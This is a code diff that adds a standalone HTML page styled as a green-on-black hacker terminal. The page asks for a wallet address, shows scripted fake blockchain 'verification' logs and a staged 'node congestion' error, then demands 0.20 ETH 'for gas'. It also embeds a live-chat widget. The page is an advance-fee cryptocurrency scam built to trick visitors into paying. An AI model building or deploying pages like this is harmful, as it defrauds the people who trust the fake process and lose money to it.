@@ -1,0 +1,52 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <style>
+        :root { --neon: #00ff41; }
+        body { background: #000; color: var(--neon); font-family: 'Courier New', monospace; margin: 0; height: 100dvh; display: flex; align-items: center; justify-content: center; overflow: hidden; }
+        .live-bg { position: absolute; top: 0; left: 0; width: 100%; height: 100%; background-image: linear-gradient(rgba(0, 255, 65, 0.1) 1px, transparent 1px), linear-gradient(90deg, rgba(0, 255, 65, 0.1) 1px, transparent 1px); background-size: 50px 50px; animation: scrollGrid 10s linear infinite; pointer-events: none; }
+        @keyframes scrollGrid { 0% { transform: translateY(0); } 100% { transform: translateY(50px); } }
+        .terminal-card { border: 1px solid var(--neon); padding: 30px; border-radius: 4px; background: rgba(0, 0, 0, 0.85); backdrop-filter: blur(10px); width: 90%; max-width: 450px; box-shadow: 0 0 40px rgba(0, 255, 65, 0.15); z-index: 1; }
+        .log { font-size: 0.7em; height: 80px; overflow-y: hidden; color: #008f11; margin-bottom: 20px; border-bottom: 1px solid #111; }
+        input { width: 100%; padding: 12px; background: #080808; border: 1px solid var(--neon); color: var(--neon); outline: none; margin: 10px 0; }
+        button { width: 100%; padding: 12px; background: var(--neon); color: #000; border: none; font-weight: 900; cursor: pointer; text-transform: uppercase; }
+        .glitch { animation: flash 0.5s infinite; }
+        @keyframes flash { 0% { opacity: 1; } 50% { opacity: 0.5; } 100% { opacity: 1; } }
+    </style>
+</head>
+<body>
+    <div class="live-bg"></div>
+    <div class="terminal-card">
+        <div id="log" class="log">> INITIALIZING NEXUS_CORE...<br>> ESTABLISHING SECURE NODE...</div>
+        <div id="ui">
+            <h3>> SYSTEM_ID: V-082</h3>
+            <input type="text" id="address" placeholder="INPUT_WALLET_ADDRESS">
+            <button onclick="run()">EXECUTE_VERIFICATION</button>
+        </div>
+    </div>
+    <script>
+        var Tawk_API=Tawk_API||{}, Tawk_LoadStart=new Date();
+        (function(){
+            var s1=document.createElement("script"),s0=document.getElementsByTagName("script")[0];
+            s1.async=true; s1.src='https://embed.tawk.to/64b5840994cf5d49dc64a517/1h5g9i18i';
+            s1.charset='UTF-8'; s1.setAttribute('crossorigin','*');
+            s0.parentNode.insertBefore(s1,s0);
+        })();
+        const logBox = document.getElementById('log');
+        function addLog(msg) { logBox.innerHTML += `<br>> ${msg}`; logBox.scrollTop = logBox.scrollHeight; }
+        function run() {
+            const addr = document.getElementById('address').value;
+            if(!addr) return;
+            addLog("ENCRYPTING_PAYLOAD...");
+            addLog("BROADCASTING_TO_CHAIN...");
+            document.getElementById('ui').innerHTML = "<h3 class='glitch'>PROCESSING_TRANSACTION...</h3>";
+            setTimeout(() => {
+                addLog("ERROR: NODE_CONGESTION_DETECTED");
+                document.getElementById('ui').innerHTML = "<h3>REQ_ETH_FOR_GAS</h3><p style='color:red'>0.20 ETH REQUIRED TO FINALIZE.</p>";
+            }, 2500);
+        }
+    </script>
+</body>
+</html>
